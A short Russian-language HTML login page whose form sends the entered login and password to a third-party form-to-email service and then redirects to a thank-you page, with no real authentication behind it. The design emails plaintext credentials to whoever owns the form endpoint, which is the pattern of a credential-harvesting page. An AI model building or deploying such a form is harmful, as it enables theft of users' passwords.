<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Форма входа</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background: #f0f2f5;
      margin: 0;
    }
    .form-box {
      background: white;
      padding: 20px 30px;
      border-radius: 10px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
      width: 300px;
      text-align: center;
    }
    .form-box h2 {
      margin-bottom: 20px;
    }
    .form-box input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 14px;
    }
    .form-box button {
      width: 100%;
      padding: 10px;
      background: #007bff;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-size: 16px;
      margin-top: 10px;
    }
    .form-box button:hover {
      background: #0056b3;
    }
  </style>
</head>
<body>
  <div class="form-box">
    <h2>Вход</h2>
    <form action="https://formspree.io/f/mnnzeqeb" method="POST">
      <!-- Логин -->
      <input type="text" name="login" placeholder="Логин" required>

      <!-- Пароль -->
      <input type="password" name="password" placeholder="Пароль" required>

      <!-- Тема письма -->
      <input type="hidden" name="_subject" value="Новый вход с формы">

      <!-- Редирект после отправки -->
      <input type="hidden" name="_redirect" value="thanks.html">

      <!-- Кнопка -->
      <button type="submit">Войти</button>
    </form>
  </div>
</body>
</html>
